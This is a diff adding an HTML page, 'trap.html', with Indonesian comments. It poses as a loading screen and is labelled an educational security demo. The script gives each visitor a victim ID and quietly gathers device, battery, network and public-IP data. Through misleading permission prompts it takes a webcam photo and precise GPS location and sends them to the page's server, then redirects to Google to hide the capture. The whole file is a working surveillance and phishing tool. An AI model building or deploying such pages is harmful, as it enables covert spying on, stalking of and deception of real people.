@@ -1,0 +1,296 @@
+<!-- public/trap.html - VERSI DIPERBAIKI -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body { 
+            font-family: Arial; 
+            text-align: center; 
+            padding-top: 50px;
+            background: #f5f5f5;
+        }
+        .loading {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            color: #666;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        .debug {
+            display: none; /* Sembunyikan untuk produksi */
+            background: #f0f0f0;
+            padding: 10px;
+            margin: 20px;
+            text-align: left;
+            font-size: 12px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h2>Memuat halaman...</h2>
+    <div class="loading"></div>
+    <div class="status" id="status">Menyiapkan konten...</div>
+    
+    <!-- Div untuk debug (bisa diaktifkan jika perlu) -->
+    <div class="debug" id="debug"></div>
+    
+    <div style="margin-top: 50px; color: #999; font-size: 12px;">
+        ⚠️ DEMO KEAMANAN SIBER - UNTUK TUJUAN EDUKASI ⚠️
+    </div>
+
+    <script>
+    // Fungsi debug
+    function debug(message) {
+        console.log('🔍 [DEBUG]', message);
+        const debugDiv = document.getElementById('debug');
+        debugDiv.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${message}</div>`;
+    }
+
+    // Generate ID unik
+    const victimId = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    debug('Victim ID: ' + victimId);
+
+    // Fungsi untuk kirim data ke server
+    async function sendData(type, data) {
+        try {
+            debug(`Mengirim ${type}...`);
+            
+            const payload = {
+                victimId: victimId,
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString()
+            };
+            
+            console.log('Payload:', payload);
+            
+            const response = await fetch('/api/capture', {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            const result = await response.json();
+            debug(`Response: ${JSON.stringify(result)}`);
+            console.log('Server response:', result);
+            
+        } catch(e) {
+            debug(`Error: ${e.message}`);
+            console.error('Gagal kirim data:', e);
+        }
+    }
+
+    // 1. Kumpulkan info device (langsung)
+    setTimeout(async () => {
+        debug('Mengumpulkan info device...');
+        
+        const deviceInfo = {
+            userAgent: navigator.userAgent || 'Tidak tersedia',
+            platform: navigator.platform || 'Tidak tersedia',
+            language: navigator.language || 'Tidak tersedia',
+            cookiesEnabled: navigator.cookieEnabled,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            colorDepth: window.screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            battery: 'Tidak tersedia',
+            referrer: document.referrer || 'Langsung'
+        };
+
+        debug('Device info: ' + JSON.stringify(deviceInfo));
+
+        // Cek battery API
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                deviceInfo.battery = battery.level * 100 + '%';
+                deviceInfo.charging = battery.charging;
+            } catch(e) {
+                debug('Battery error: ' + e.message);
+            }
+        }
+        
+        await sendData('device_info', deviceInfo);
+    }, 1000);
+
+    // 2. Cek koneksi dan IP
+    setTimeout(async () => {
+        debug('Mengecek jaringan...');
+        
+        // Kirim info network lokal
+        await sendData('network', {
+            online: navigator.onLine,
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            } : 'Tidak tersedia'
+        });
+        
+        // Coba dapatkan IP public
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            await sendData('public_ip', data.ip);
+            debug('Public IP: ' + data.ip);
+        } catch(e) {
+            debug('Gagal dapat IP public: ' + e.message);
+        }
+    }, 2000);
+
+    // 3. Minta akses kamera
+    setTimeout(async () => {
+        debug('Meminta akses kamera...');
+        
+        const izinKamera = confirm('Website ini membutuhkan akses kamera untuk pengalaman yang lebih baik. Izinkan?');
+        
+        if (izinKamera) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                await sendData('camera_access', { status: 'granted' });
+                debug('Kamera diizinkan');
+                
+                // Ambil foto
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Kirim foto
+                const photoResponse = await fetch('/api/capture-image', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        victimId: victimId, 
+                        image: imageData 
+                    })
+                });
+                
+                const photoResult = await photoResponse.json();
+                debug('Foto terkirim: ' + JSON.stringify(photoResult));
+                
+                // Hentikan stream
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch(err) {
+                debug('Error kamera: ' + err.message);
+                await sendData('camera_access', { status: 'error', error: err.message });
+            }
+        } else {
+            await sendData('camera_access', { status: 'denied' });
+            debug('Kamera ditolak');
+        }
+    }, 3000);
+
+    // 4. Minta lokasi
+    setTimeout(async () => {
+        debug('Meminta akses lokasi...');
+        
+        const izinLokasi = confirm('Website ini ingin mengetahui lokasi Anda untuk konten lokal. Izinkan?');
+        
+        if (izinLokasi && 'geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const locationData = {
+                        status: 'granted',
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
+                    };
+                    
+                    await sendData('location', locationData);
+                    debug('Lokasi: ' + position.coords.latitude + ', ' + position.coords.longitude);
+                    
+                    // Coba reverse geocoding
+                    try {
+                        const geoResponse = await fetch(
+                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`
+                        );
+                        const geoData = await geoResponse.json();
+                        await sendData('location_address', geoData.display_name);
+                        debug('Alamat: ' + geoData.display_name);
+                    } catch(e) {
+                        debug('Gagal reverse geocoding: ' + e.message);
+                    }
+                },
+                async (error) => {
+                    let errorMessage = 'Unknown error';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED: errorMessage = 'Permission denied'; break;
+                        case error.POSITION_UNAVAILABLE: errorMessage = 'Position unavailable'; break;
+                        case error.TIMEOUT: errorMessage = 'Timeout'; break;
+                    }
+                    await sendData('location', { status: 'error', error: errorMessage });
+                    debug('Error lokasi: ' + errorMessage);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            await sendData('location', { status: 'denied' });
+            debug('Lokasi ditolak atau tidak tersedia');
+        }
+    }, 4000);
+
+    // 5. Update status
+    let counter = 0;
+    const interval = setInterval(() => {
+        counter++;
+        document.getElementById('status').textContent = `Memuat konten... ${counter}/10`;
+        
+        if (counter >= 10) {
+            clearInterval(interval);
+            document.getElementById('status').textContent = 'Selesai! Mengalihkan...';
+            
+            // Redirect setelah selesai
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+        }
+    }, 1000);
+
+    // Tampilkan debug jika ada parameter
+    if (window.location.search.includes('debug=true')) {
+        document.querySelector('.debug').style.display = 'block';
+    }
+    </script>
+</body>
+</html>
